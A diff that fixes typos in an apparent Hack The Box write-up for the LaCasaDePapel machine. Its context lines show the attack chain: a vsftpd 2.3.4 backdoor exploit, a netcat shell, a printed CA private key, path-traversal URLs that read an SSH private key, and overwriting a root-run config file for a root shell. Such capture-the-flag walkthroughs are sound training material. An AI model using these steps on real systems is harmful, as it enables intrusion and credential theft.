@@ -45,7 +45,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 # Nmap done at Mon May 27 18:17:24 2019 -- 1 IP address (1 host up) scanned in 32.68 seconds
 ```
 <br>
-A few ports are open but the one that peaks my interest is FTP. I know for a face that <b>vsftpd 2.3.4</b> is vulnerable. I will use the metasploit module <b>exploit/unix/ftp/vsftpd_234_backdoorv2.3.4 Backdoor Command Execution</b> for this.
+A few ports are open but the one that peaks my interest is FTP. I know for a fact that <b>vsftpd 2.3.4</b> is vulnerable. I will use the metasploit module <b>exploit/unix/ftp/vsftpd_234_backdoorv2.3.4 Backdoor Command Execution</b> for this.
 ```
 msf5 exploit(unix/ftp/vsftpd_234_backdoor) > show options
 
@@ -63,7 +63,7 @@ Exploit target:
    --  ----
    0   Automatic
 ```
-The only thing that we have to set is the RHOSTS. Running the exploit we see that the expoit completed but no sessions was created
+The only thing that we have to set is the RHOSTS. Running the exploit we see that the exploit completed but no session was created
 ```
 msf5 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 10.10.10.131
 RHOSTS => 10.10.10.131
@@ -73,7 +73,7 @@ msf5 exploit(unix/ftp/vsftpd_234_backdoor) > run
 [*] 10.10.10.131:21 - USER: 331 Please specify the password.
 [*] Exploit completed, but no session was created.
 ```
-If we run the exploit a second time we get a different message. It says that the port for the backdoor is open but its not a shell which most likely means its not a bash shell.
+If we run the exploit a second time we get a different message. It says that the port for the backdoor is open but it's not a shell which most likely means it's not a bash shell.
 ```
 msf5 exploit(unix/ftp/vsftpd_234_backdoor) > run
 
@@ -81,7 +81,7 @@ msf5 exploit(unix/ftp/vsftpd_234_backdoor) > run
 [-] 10.10.10.131:21 - The service on port 6200 does not appear to be a shell
 [*] Exploit completed, but no session was created.
 ```
-Running an nmap scan on port 6200 will show that the port is now open
+Running an Nmap scan on port 6200 will show that the port is now open
 ```
 # nmap -p 6200 10.10.10.131
 Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-18 12:30 EDT
@@ -93,7 +93,7 @@ PORT     STATE SERVICE
 
 Nmap done: 1 IP address (1 host up) scanned in 0.79 seconds
 ```
-We can use netcat to connect to the backdoor. Once in we are greeted with a Psy Shell which is basically a php Shell
+We can use <b>netcat</b> to connect to the backdoor. Once in we are greeted with a Psy Shell which is basically a PHP Shell
 ```
 # nc -nv 10.10.10.131 6200
 Ncat: Version 7.80 ( https://nmap.org/ncat )
@@ -164,7 +164,7 @@ dir('/home/oslo');
      "static",
    ]
 ```
-Seeing that <b>ca.key</b> made me want to check out port 443. Navigating to the webpage my hunch was confirmed when it asks us for a client certificate to access the full webpage.
+Seeing that <b>ca.key</b> made me want to check out port 443. Navigating to the web page my hunch was confirmed when it asks us for a client certificate to access the full web page.
 
 <center><img src="/htb/lacasadepapel/webpage.png"></center>
 <br>
@@ -200,7 +200,7 @@ aRklful5+Z60JV/5t2Wt9gyHYZ6SYMzApUanVXaWCCNVoeq+yvzId0st2DRl83Vc
 53udBEzjt3WPqYGkkDknVhjD
 -----END PRIVATE KEY-----
 ```
-Now the next step is to grab the <b>.crt</b> file from your web browser. in firefox navigate to <b>Preferences > Privacy and Security > View Certificates</b>. Once there, in the top right click on <b>Authorities</b> and scroll down until you see the certificate for <b>lacasadepapelhtb.htb</b> and then import/download it to you host machine.
+Now the next step is to grab the <b>.crt</b> file from your web browser. In Firefox navigate to <b>Preferences > Privacy and Security > View Certificates</b>. Once there, in the top right click on <b>Authorities</b> and scroll down until you see the certificate for <b>lacasadepapelhtb.htb</b> and then import/download it to you host machine.
 
 <center><img src="/htb/lacasadepapel/certificate.png"></center>
 <br>
@@ -210,15 +210,15 @@ Now we need to create our client certificate. To do this we will use <b>openssl<
 Enter Export Password:
 Verifying - Enter Export Password:
 ```
-Now we need to import the <b>lacasadepapel.p12</b> into firefox. Go back to <b>Preferences > Privacy and Security > View Certificates</b> except this time choose <b>Your Certificates</b>. Then choose import and select the certificate.
+Now we need to import the <b>lacasadepapel.p12</b> into Firefox. Go back to <b>Preferences > Privacy and Security > View Certificates</b> except this time choose <b>Your Certificates</b>. Then choose import and select the certificate.
 
 <center><img src="/htb/lacasadepapel/p12.png"></center>
 <br>
-Now if we go back to the webpage and refresh it, we no longer get the client certificate error.
+Now if we go back to the web page and refresh it, we no longer get the client certificate error.
 
 <center><img src="/htb/lacasadepapel/in.png"></center>
 <br>
-Looking through all the <b>avi</b> files I dont find anything since they are all empty but I looking a the source code of the webpage does reveal something interesting at the bottom. We see some files stored in a <b>/file</b> directory with files that look like they are encoded in base64. Using this we can do 2 things:
+Looking through all the <b>avi</b> files I don't find anything since they are all empty but I looking a the source code of the webpage does reveal something interesting at the bottom. We see some files stored in a <b>/file</b> directory with files that look like they are encoded in base64. Using this we can do 2 things:
 -Grab the user flag in <b>/home/berlin</b>
 -Grab an ssh private key from <b>/home/berlin/.ssh/id_rsa</b> and log in with it
 ```
@@ -238,7 +238,7 @@ https://10.10.10.131/file/Li4vLi4vLi4vLi4vaG9tZS9iZXJsaW4vLnNzaC9pZF9yc2E=
 ```
 <center><img src="/htb/lacasadepapel/key.png"></center>
 <br>
-Now my first thought was to SSH in as the user <b>berlin</b> since that is where we found the key but it didnt work. I decided to try the other users and it ended up working with the user <b>professor</b>
+Now my first thought was to SSH in as the user <b>berlin</b> since that is where we found the key but it didn't work. I decided to try the other users and it ended up working with the user <b>professor</b>
 ```
 # ssh -i id_rsa professor@10.10.10.131
 
@@ -284,7 +284,7 @@ cat memcached.ini
 [program:memcached]
 command = sudo -u nobody /usr/bin/node /home/professor/memcached.js
 ```
-This file has the same command that is being executed in the process. This tells me that the cron job is executing anything in this file as root. My first thought was we need to edit the <b>memcached.ini</b> file to put in a reverse shell to give me root but I saw that we don't have write permissions. After a sometime had passed, I had realized I needed to go back to the basics. Even though the file is owned by root, we can still delete the file because it is in our home directory. All we need to do is replace it with a file of our own with the same name to give us a root shell
+This file has the same command that is being executed in the process. This tells me that the cron job is executing anything in this file as root. My first thought was we need to edit the <b>memcached.ini</b> file to put in a reverse shell to give me root but I saw that we don't have write permissions. After sometime had passed, I had realized I needed to go back to the basics. Even though the file is owned by root, we can still delete the file because it is in our home directory. All we need to do is replace it with a file of our own with the same name to give us a root shell
 ```
 # rm memcached.ini
 rm: remove 'memcached.ini'? y
